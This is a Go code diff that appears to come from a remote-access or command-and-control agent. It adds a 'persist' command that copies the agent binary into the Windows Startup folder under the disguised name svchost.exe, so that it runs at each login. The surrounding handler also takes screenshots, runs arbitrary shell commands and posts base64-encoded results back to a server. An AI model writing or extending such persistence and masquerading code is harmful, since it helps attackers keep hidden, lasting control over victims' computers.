@@ -10,6 +10,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"path/filepath"
 	"strconv"
 
 	"github.com/mitchellh/go-ps"
@@ -62,13 +63,52 @@ func HandleAgentCommands(ID int, command string, agent messages.NewAgent) {
 	case "screenshot":
 		resp := takeScreenshot(agent)
 		requests.PostCommand(ID, command, resp, agent)
-
+	case "persist":
+		resp := persistAgent(agent)
+		requests.PostCommand(ID, command, resp, agent)
 	default:
 		resp := shellCommand(command, agent)
 		// resp := B64Encode("This command doesn't exists or not implemented yet!")
 		requests.PostCommand(ID, command, resp, agent)
 	}
 
+}
+
+func persistAgent(agent messages.NewAgent) (resp string) {
+	resp = ""
+	if agent.SO == "windows" {
+		fileName := filepath.Base(os.Args[0])
+		roaming, err := os.UserConfigDir()
+		if err != nil {
+			resp = "Error to load startup directory: " + err.Error()
+			b64 := middlewares.B64Encode(resp)
+			return b64
+		}
+
+		startUpDir := roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe"
+
+		input, err := os.ReadFile(fileName)
+		if err != nil {
+			resp = "Error to read agent: " + err.Error()
+			b64 := middlewares.B64Encode(resp)
+			return b64
+		}
+
+		err = os.WriteFile(startUpDir, input, 0777)
+		if err != nil {
+			resp = "Error to copy agent: " + err.Error()
+			b64 := middlewares.B64Encode(resp)
+			return b64
+		}
+
+		resp = "Agent saved at: " + startUpDir
+		b64 := middlewares.B64Encode(resp)
+		return b64
+	}
+
+	resp = "Command not implemented to this SO yet!"
+	b64 := middlewares.B64Encode(resp)
+	return b64
 }
 
 func takeScreenshot(agent messages.NewAgent) string {
